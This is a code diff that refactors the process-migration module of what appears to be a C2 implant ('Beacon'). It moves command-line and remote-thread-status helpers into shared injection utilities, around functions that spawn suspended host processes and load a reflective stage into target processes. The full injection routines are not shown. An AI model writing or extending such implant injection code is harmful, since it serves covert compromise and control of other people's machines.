@@ -3,24 +3,6 @@
 
 #define MIGRATE_START_WAIT_MS 1500u
 
-/* 构造被迁移宿主进程的命令行，保留 exe 路径引号以兼容空格路径。 */
-static BOOL MigrateBuildSpawnCommandLine(const CHAR* exe_path,
-                                         const CHAR* args,
-                                         CHAR* out,
-                                         SIZE_T out_size)
-{
-    if (!exe_path || !exe_path[0] || !out || out_size == 0) {
-        return FALSE;
-    }
-
-    if (args && args[0]) {
-        return _snprintf_s(out, out_size, _TRUNCATE,
-                           "\"%s\" %s", exe_path, args) > 0;
-    }
-    return _snprintf_s(out, out_size, _TRUNCATE,
-                       "\"%s\"", exe_path) > 0;
-}
-
 /* 校验当前 Beacon 是否具备注入请求架构的能力。 */
 static BOOL MigrateLocalSupportsMachine(WORD requested_machine,
                                         CHAR* err,
@@ -101,43 +83,12 @@ static BOOL MigrateValidateTargetMachine(HANDLE process,
     return TRUE;
 }
 
-/* 格式化远程线程的即时状态，供 migrate 启动评估返回给上层。 */
+/* 格式化远程线程即时状态：委托给共用工具 InjectFormatRemoteThreadStatus。 */
 static VOID MigrateFormatRemoteThreadStatus(HANDLE thread,
                                             CHAR* out,
                                             SIZE_T out_size)
 {
-    DWORD wait_rc;
-    DWORD exit_code = 0;
-
-    if (!out || out_size == 0) return;
-    out[0] = '\0';
-
-    if (!thread) {
-        strcpy_s(out, out_size, "remote_thread=null");
-        return;
-    }
-
-    wait_rc = WaitForSingleObject(thread, 0);
-    if (wait_rc == WAIT_TIMEOUT) {
-        strcpy_s(out, out_size, "remote_thread=running");
-        return;
-    }
-    if (wait_rc == WAIT_OBJECT_0) {
-        if (GetExitCodeThread(thread, &exit_code)) {
-            _snprintf_s(out, out_size, _TRUNCATE,
-                        "remote_thread=exited:0x%08lx",
-                        (unsigned long)exit_code);
-        } else {
-            _snprintf_s(out, out_size, _TRUNCATE,
-                        "remote_thread=exited:GetExitCodeThread failed:%lu",
-                        (unsigned long)GetLastError());
-        }
-        return;
-    }
-
-    _snprintf_s(out, out_size, _TRUNCATE,
-                "remote_thread=wait_failed:%lu",
-                (unsigned long)GetLastError());
+    InjectFormatRemoteThreadStatus(thread, out, out_size);
 }
 
 /* 准备 reflective stage：写入目标进程并解析 REFLoader 远程入口。 */
@@ -216,7 +167,7 @@ static BOOL MigrateAssessStart(HANDLE process,
         wait_rc != WAIT_TIMEOUT) {
         if (err) _snprintf_s(err, err_size, _TRUNCATE,
                              "migrate remote stage exited early: pid:%lu %s; %s",
-                             (unsigned long)pid, thread_status, process_status);
+                             (ULONG)pid, thread_status, process_status);
         return FALSE;
     }
 
@@ -225,7 +176,7 @@ static BOOL MigrateAssessStart(HANDLE process,
         exit_code != 0) {
         if (err) _snprintf_s(err, err_size, _TRUNCATE,
                              "migrate remote stage exited early: pid:%lu %s; %s",
-                             (unsigned long)pid, thread_status, process_status);
+                             (ULONG)pid, thread_status, process_status);
         return FALSE;
     }
 
@@ -261,7 +212,7 @@ static BOOL MigrateCreateSuspendedHost(const WCHAR* command_line,
                         NULL, NULL, &si, &pi)) {
         if (err) _snprintf_s(err, err_size, _TRUNCATE,
                              "migrate spawn CreateProcess failed: %lu",
-                             (unsigned long)GetLastError());
+                             (ULONG)GetLastError());
         return FALSE;
     }
 
@@ -302,8 +253,8 @@ BOOL MigrateSpawnStage(const MigrateRequest* req,
     if (!MigrateValidateStageMachine(req, &stage_machine, err, err_size)) {
         return FALSE;
     }
-    if (!MigrateBuildSpawnCommandLine(req->spawn_path, req->spawn_args,
-                                      command_line, sizeof(command_line))) {
+    if (!InjectBuildSpawnCommandLine(req->spawn_path, req->spawn_args,
+                                     command_line, sizeof(command_line))) {
         if (err) strcpy_s(err, err_size, "migrate spawn command line too long");
         return FALSE;
     }
@@ -424,7 +375,7 @@ BOOL MigrateInjectStage(const MigrateRequest* req,
     if (!process) {
         if (err) _snprintf_s(err, err_size, _TRUNCATE,
                              "migrate OpenProcess failed: %lu",
-                             (unsigned long)GetLastError());
+                             (ULONG)GetLastError());
         return FALSE;
     }
 
